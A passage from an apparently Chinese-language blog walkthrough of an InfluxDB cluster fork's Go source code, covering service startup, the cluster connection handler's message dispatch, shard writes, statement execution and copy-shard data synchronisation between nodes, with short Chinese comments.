s.TSDBStore != <span class="literal">nil</span> &amp;&amp; !s.DataServicesOpened &#123;</span><br><span class="line">s.DataServicesOpened = <span class="literal">true</span></span><br><span class="line"><span class="comment">// Append services.</span></span><br><span class="line">s.appendClusterService(s.config.Cluster)   <span class="comment">// 增加集群服务注册</span></span><br><span class="line">s.appendMonitorService()</span><br><span class="line">s.appendPrecreatorService(s.config.Precreator)</span><br><span class="line">s.appendSnapshotterService()</span><br><span class="line">s.appendContinuousQueryService(s.config.ContinuousQuery)</span><br><span class="line">s.appendAntiEntropyService(s.config.AntiEntropy)</span><br><span class="line">s.appendHTTPDService(s.config.HTTPD)</span><br><span class="line">s.appendStorageService(s.config.Storage)</span><br><span class="line">s.appendRetentionPolicyService(s.config.Retention)</span><br><span class="line"><span class="keyword">for</span> _, i := <span class="keyword">range</span> s.config.GraphiteInputs &#123;</span><br><span class="line"><span class="keyword">if</span> err := s.appendGraphiteService(i); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, i := <span class="keyword">range</span> s.config.CollectdInputs &#123;</span><br><span class="line">s.appendCollectdService(i)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, i := <span class="keyword">range</span> s.config.OpenTSDBInputs &#123;</span><br><span class="line"><span class="keyword">if</span> err := s.appendOpenTSDBService(i); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, i := <span class="keyword">range</span> s.config.UDPInputs &#123;</span><br><span class="line">s.appendUDPService(i)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s.Subscriber.MetaClient = s.MetaClient</span><br><span class="line">s.PointsWriter.MetaClient = s.MetaClient</span><br><span class="line">s.Monitor.MetaClient = s.MetaClient</span><br><span class="line">s.ShardWriter.MetaClient = s.MetaClient</span><br><span class="line">s.HintedHandoff.MetaClient = s.MetaClient</span><br><span class="line"></span><br><span class="line">s.ClusterService.Listener = s.Mux.Listen(cluster.MuxHeader)</span><br><span class="line">s.SnapshotterService.Listener = s.Mux.Listen(snapshotter.MuxHeader)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Configure logging for all services and clients.</span></span><br><span class="line"><span class="keyword">if</span> s.config.Meta.LoggingEnabled &#123;</span><br><span class="line">s.MetaClient.WithLogger(s.Logger)</span><br><span class="line">&#125;</span><br><span class="line">s.TSDBStore.WithLogger(s.Logger)</span><br><span class="line"><span class="keyword">if</span> s.config.Data.QueryLogEnabled &#123;</span><br><span class="line">s.QueryExecutor.WithLogger(s.Logger)</span><br><span class="line">&#125;</span><br><span class="line">s.PointsWriter.WithLogger(s.Logger)</span><br><span class="line">s.Subscriber.WithLogger(s.Logger)</span><br><span class="line">s.HintedHandoff.WithLogger(s.Logger)</span><br><span class="line"><span class="keyword">for</span> _, svc := <span class="keyword">range</span> s.Services &#123;</span><br><span class="line">svc.WithLogger(s.Logger)</span><br><span class="line">&#125;</span><br><span class="line">s.SnapshotterService.WithLogger(s.Logger)</span><br><span class="line">s.Monitor.WithLogger(s.Logger)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Open TSDB store.</span></span><br><span class="line"><span class="keyword">if</span> err := s.TSDBStore.Open(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"open tsdb store: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Open the hinted handoff service</span></span><br><span class="line"><span class="keyword">if</span> err := s.HintedHandoff.Open(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"open hinted handoff: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Open the subscriber service</span></span><br><span class="line"><span class="keyword">if</span> err := s.Subscriber.Open(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"open subscriber: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Open the points writer service</span></span><br><span class="line"><span class="keyword">if</span> err := s.PointsWriter.Open(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"open points writer: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s.PointsWriter.AddWriteSubscriber(s.Subscriber.Points())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, service := <span class="keyword">range</span> s.Services &#123;</span><br><span class="line"><span class="keyword">if</span> err := service.Open(); err != <span class="literal">nil</span> &#123;             <span class="comment">//集群服务启动</span></span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"open service: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> s.TSDBStore == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"Data server is not enabled"</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动集群服务代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Open opens the network listener and begins serving requests.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Service)</span> <span class="title">Open</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line"></span><br><span class="line">s.Logger.Info(<span class="string">"Starting cluster service"</span>)</span><br><span class="line"><span class="comment">// Begin serving conections.</span></span><br><span class="line">s.wg.Add(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">go</span> s.serve()   <span class="comment">//启动服务</span></span><br><span class="line"></span><br><span class="line">s.CopyShardTaskManager.Logger = s.Logger</span><br><span class="line"><span class="keyword">go</span> s.CopyShardTaskManager.WaitForTask()               <span class="comment">//等待task任务</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>serve函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// serve accepts connections from the listener and handles them.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Service)</span> <span class="title">serve</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> s.wg.Done()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="comment">// Check if the service is shutting down.</span></span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-s.closing:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Accept the next connection.</span></span><br><span class="line">conn, err := s.Listener.Accept()            <span class="comment">//监听连接请求</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> strings.Contains(err.Error(), <span class="string">"connection closed"</span>) &#123;</span><br><span class="line">s.Logger.Info(<span class="string">"cluster service accept error"</span>, zap.Error(err))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">s.Logger.Info(<span class="string">"accept error"</span>, zap.Error(err))</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Delegate connection handling to a separate goroutine.</span></span><br><span class="line">s.wg.Add(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> s.wg.Done()</span><br><span class="line">s.handleConn(conn)             <span class="comment">//主要处理函数</span></span><br><span class="line">&#125;()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>handleConn函数启动：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// handleConn services an individual TCP connection.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Service)</span> <span class="title">handleConn</span><span class="params">(conn net.Conn)</span></span> &#123;</span><br><span class="line"><span class="comment">// Ensure connection is closed when service is closed.</span></span><br><span class="line">closing := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line"><span class="keyword">defer</span> <span class="built_in">close</span>(closing)</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-closing:</span><br><span class="line"><span class="keyword">case</span> &lt;-s.closing:</span><br><span class="line">&#125;</span><br><span class="line">conn.Close()</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line">s.Logger.Info(<span class="string">"accept remote connection"</span>, zap.String(<span class="string">"remoteaddr"</span>, conn.RemoteAddr().String()))</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">s.Logger.Info(<span class="string">"close remote connection"</span>, zap.String(<span class="string">"remoteaddr"</span>, conn.RemoteAddr().String()))</span><br><span class="line">&#125;()</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="comment">// Read type-length-value.</span></span><br><span class="line">typ, err := ReadType(conn)     <span class="comment">//读取连接的数据类型</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> strings.HasSuffix(err.Error(), <span class="string">"EOF"</span>) &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">s.Logger.Info(<span class="string">"unable to read type"</span>, zap.Error(err))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Delegate message processing by type.</span></span><br><span class="line">        <span class="comment">//处理不同数据类型</span></span><br><span class="line"><span class="keyword">switch</span> typ &#123;</span><br><span class="line"><span class="keyword">case</span> writeShardRequestMessage:</span><br><span class="line">buf, err := ReadLV(conn)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">s.Logger.Error(<span class="string">"unable to read length-value"</span>, zap.Error(err))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//处理写shared请求</span></span><br><span class="line">atomic.AddInt64(&amp;s.stats.WriteShardReq, <span class="number">1</span>)</span><br><span class="line">err = s.processWriteShardRequest(buf)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">s.Logger.Info(<span class="string">"process write shard error"</span>, zap.Error(err))</span><br><span class="line">&#125;</span><br><span class="line">            <span class="comment">//处理写请求返回</span></span><br><span class="line">s.writeShardResponse(conn, err)</span><br><span class="line"><span class="keyword">case</span> executeStatementRequestMessage:</span><br><span class="line">buf, err := ReadLV(conn) <span class="comment">// ReadLV reads the length-value from a TLV record.</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">s.Logger.Info(<span class="string">"unable to read length-value"</span>, zap.Error(err))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//处理执行</span></span><br><span class="line">err = s.processExecuteStatementRequest(buf)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">s.Logger.Info(<span class="string">"process execute statement error"</span>, zap.Error(err))</span><br><span class="line">&#125;</span><br><span class="line">s.writeShardResponse(conn, err)</span><br><span class="line"><span class="keyword">case</span> createIteratorRequestMessage:</span><br><span class="line">atomic.AddInt64(&amp;s.stats.CreateIteratorReq, <span class="number">1</span>)</span><br><span class="line">s.processCreateIteratorRequest(conn)  <span class="comment">//创建请求的interator</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">case</span> fieldDimensionsRequestMessage:</span><br><span class="line">atomic.AddInt64(&amp;s.stats.FieldDimensionsReq, <span class="number">1</span>)</span><br><span class="line">s.processFieldDimensionsRequest(conn)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">case</span> createIteratorCostRequestMessage:</span><br><span class="line">s.processCreateIteratorCostRequest(conn)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">case</span> mapTypeRequestMessage:</span><br><span class="line">s.processMapTypeRequest(conn)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">case</span> seriesKeysRequestMessage:</span><br><span class="line"><span class="comment">//s.statMap.Add(seriesKeysReq, 1)</span></span><br><span class="line"><span class="comment">//atomic.AddInt64(&amp;s.stats.FieldDimensionsReq, 1)</span></span><br><span class="line"><span class="comment">//s.processSeriesKeysRequest(conn)</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">case</span> copyShardRequestMessage:</span><br><span class="line">s.processCopyShardRequest(conn)   <span class="comment">//处理copy shared分片请求</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">s.Logger.Info(<span class="string">"cluster service message type not found"</span>, zap.Binary(<span class="string">"type"</span>, []<span class="keyword">byte</span>&#123;typ&#125;))</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>processWriteShardRequest函数处理请求写操作，将数据写入shared分片中。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Service)</span> <span class="title">processWriteShardRequest</span><span class="params">(buf []<span class="keyword">byte</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="comment">// Build request</span></span><br><span class="line"><span class="keyword">var</span> req WriteShardRequest</span><br><span class="line"><span class="keyword">if</span> err := req.UnmarshalBinary(buf); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">points := req.Points()</span><br><span class="line">atomic.AddInt64(&amp;s.stats.WriteShardPointsReq, <span class="keyword">int64</span>(<span class="built_in">len</span>(points)))</span><br><span class="line">err := s.TSDBStore.WriteToShard(req.ShardID(), points)</span><br><span class="line"></span><br><span class="line"><span class="comment">// We may have received a write for a shard that we don't have locally because the</span></span><br><span class="line"><span class="comment">// sending node may have just created the shard (via the metastore) and the write</span></span><br><span class="line"><span class="comment">// arrived before the local store could create the shard.  In this case, we need</span></span><br><span class="line"><span class="comment">// to check the metastore to determine what database and retention policy this</span></span><br><span class="line"><span class="comment">// shard should reside within.</span></span><br><span class="line"><span class="keyword">if</span> err == tsdb.ErrShardNotFound &#123;</span><br><span class="line">db, rp := req.Database(), req.RetentionPolicy()</span><br><span class="line"><span class="keyword">if</span> db == <span class="string">""</span> || rp == <span class="string">""</span> &#123;</span><br><span class="line">s.Logger.Info(<span class="string">"drop write request. no database or rentention policy received"</span>, logger.Shard(req.ShardID()))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = s.TSDBStore.CreateShard(req.Database(), req.RetentionPolicy(), req.ShardID(), <span class="literal">true</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">atomic.AddInt64(&amp;s.stats.WriteShardFail, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"create shard %d: %s"</span>, req.ShardID(), err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = s.TSDBStore.WriteToShard(req.ShardID(), points)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">atomic.AddInt64(&amp;s.stats.WriteShardFail, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"write shard %d: %s"</span>, req.ShardID(), err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">atomic.AddInt64(&amp;s.stats.WriteShardFail, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"write shard %d: %s"</span>, req.ShardID(), err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解析statements请求操作，并执行statement语句：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Service)</span> <span class="title">processExecuteStatementRequest</span><span class="params">(buf []<span class="keyword">byte</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="comment">// Unmarshal the request.</span></span><br><span class="line"><span class="keyword">var</span> req ExecuteStatementRequest</span><br><span class="line"><span class="keyword">if</span> err := req.UnmarshalBinary(buf); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Parse the InfluxQL statement.</span></span><br><span class="line">stmt, err := influxql.ParseStatement(req.Statement())</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//处理不同的删除操作</span></span><br><span class="line"><span class="keyword">return</span> s.executeStatement(stmt, req.Database())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>WaitForTask用于同步influxdb节点之间数据</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t *CopyShardTaskManager)</span> <span class="title">WaitForTask</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">if</span> t.Host == <span class="string">""</span> &#123;</span><br><span class="line">dataNodes, _ := t.MetaClient.DataNodes()   <span class="comment">//获取所有的数据节点</span></span><br><span class="line"><span class="keyword">for</span> _, nodeInfo := <span class="keyword">range</span> dataNodes &#123;</span><br><span class="line"><span class="keyword">if</span> nodeInfo.ID == t.Node.GetDataID() &#123;</span><br><span class="line">t.Host = nodeInfo.TCPHost</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">copyShards := t.MetaClient.CopyShardStatus()   <span class="comment">//拷贝需要的shared分片</span></span><br><span class="line">task := t.findTask(&amp;copyShards)          <span class="comment">//寻找task任务</span></span><br><span class="line"><span class="keyword">if</span> task != <span class="literal">nil</span> &#123;</span><br><span class="line">t.addRuningTask(task)</span><br><span class="line"><span class="keyword">go</span> task.Run()                  <span class="comment">//运行同步数据</span></span><br><span class="line">&#125;</span><br><span class="line">time.Sleep(t.IdleSleepSeconds)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Run函数运行，task任务执行：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tk *CopyShardTask)</span> <span class="title">Run</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> tk.TaskManager.removeRuningTask(tk)   <span class="comment">//销毁正在运行的任务</span></span><br><span class="line"></span><br><span class="line">err := tk.TaskManager.MetaClient.UpdateCopyShardStatus(tk.ID, meta.CopyShardCopying)  <span class="comment">//更新状态</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">tk.Logger.Warn(<span class="string">"update copy shard status to copying failed"</span>,</span><br><span class="line">zap.Uint64(<span class="string">"node"</span>, tk.SrcNodeID),</span><br><span class="line">zap.Uint64(<span class="string">"shardid"</span>, tk.ShardID),</span><br><span class="line">zap.Error(err))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//同步数据更新函数</span></span><br><span class="line">err = tk.doTask()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">tk.Logger.Warn(<span class="string">"do copy shard failed"</span>,</span><br><span class="line">zap.Uint64(<span class="string">"node"</span>, tk.SrcNodeID),</span><br><span class="line">zap.Uint64(<span class="string">"shardid"</span>, tk.ShardID),</span><br><span class="line">zap.Error(err))</span><br><span class="line"><span class="comment">//更新copy shared的状态，如果失败，则任务数据同步失败</span></span><br><span class="line">err = tk.TaskManager.MetaClient.UpdateCopyShardStatus(tk.ID, meta.CopyShardFailed)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">tk.Logger.Warn(<span class="string">"update copy shard status to 'failed' failed"</span>,</span><br><span class="line">zap.Uint64(<span class="string">"node"</span>, tk.SrcNodeID),</span><br><span class="line">zap.Uint64(<span class="string">"shardid"</span>, tk.ShardID),</span><br><span class="line">zap.Error(err))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//更新copyshared状态</span></span><br><span class="line">err = tk.TaskManager.MetaClient.UpdateCopyShardStatus(tk.ID, meta.CopyShardSuccess)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">tk.Logger.Warn(<span class="string">"update copy shard status to success failed"</span>,</span><br><span class="line">zap.Uint64(<span class="string">"node"</span>, tk.SrcNodeID),</span><br><span class="line">zap.Uint64(<span class="string">"shardid"</span>, tk.ShardID),</span><br><span class="line">zap.Error(err))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tk.Logger.Info(<span class="string">"update copy shard status to success"</span>,</span><br><span class="line">zap.Uint64(<span class="string">"node"</span>, tk.SrcNodeID),</span><br><span class="line">zap.Uint64(<span class="string">"shardid"</span>, tk.ShardID))</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>doTask函数执行：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span 